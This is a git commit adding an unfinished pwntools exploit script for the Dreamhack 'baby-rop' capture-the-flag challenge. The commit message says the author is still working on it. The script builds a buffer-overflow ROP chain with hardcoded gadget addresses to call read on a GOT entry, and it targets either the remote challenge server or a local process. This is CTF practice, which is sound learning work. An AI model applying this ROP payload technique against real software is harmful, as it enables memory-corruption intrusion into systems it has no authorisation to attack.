3da9af6c34e5efcb95a343bc048ce57d45d2c9b4
Lier0102 <minehammer26@gmail.com>
2026-01-06 10:36:29 +0900

    아직도 푸는중...

---
+++ pwn/dreamhack_/baby-rop/ex.py
@@ -0,0 +1,59 @@
+from pwn import *
+
+'''
+BANKAI
+
+도커파일 출처: pandas님의 velog * (https://velog.io/@rlajunwon/Info-Ubuntu-22.04-Docker-for-PWN)
+'''
+
+context.arch = "amd64"
+context.log_level = "debug"
+context.terminal = ["tmux", "splitw", "-h"]
+
+e = ELF("./prob")
+libc = ELF("./libc.so.6")
+
+def slog(n, a): return success(": ".join([n, hex(a)]))
+
+HOST, PORT = "host8.dreamhack.games 1234".split()
+
+rop = ROP(e)
+
+if args.REMOTE:
+    p = remote(HOST, PORT)
+elif args.DOCK:
+    p = remote("localhost", 80)
+else:
+    p = process("./prob", env={"LD_PRELOAD": "./libc.so.6"})
+
+'''
+   0x00000000001147d0 <+0>:     endbr64 
+   0x00000000001147d4 <+4>:     mov    eax,DWORD PTR fs:0x18
+   0x00000000001147dc <+12>:    test   eax,eax
+   0x00000000001147de <+14>:    jne    0x1147f0 <read+32>
+   0x00000000001147e0 <+16>:    syscall 
+'''
+
+# mov edi, 0x0 -> 0x40116b
+# mov edx, 0x30 -> 0x401162
+# pop rsi -> 0x401059
+# mov eax, 0x0 -> 0x40109d
+# read, 0x404018, syscall = 0x404018 + 0x10
+
+syscall = b''
+
+slog("read@plt", e.plt["read"])
+slog("read@got", e.got["read"])
+
+pay = b'A'*0x20 # buf
+pay += b'b'*0x8
+pay += p64(0x40116b) # rdi 0
+pay += p64(0x401059) + p64(e.got["read"]) # rsi got
+pay += p64(e.plt["read"]) # read
+
+p.send(pay)
+
+gdb.attach(p)
+pause()
+
+p.interactive()
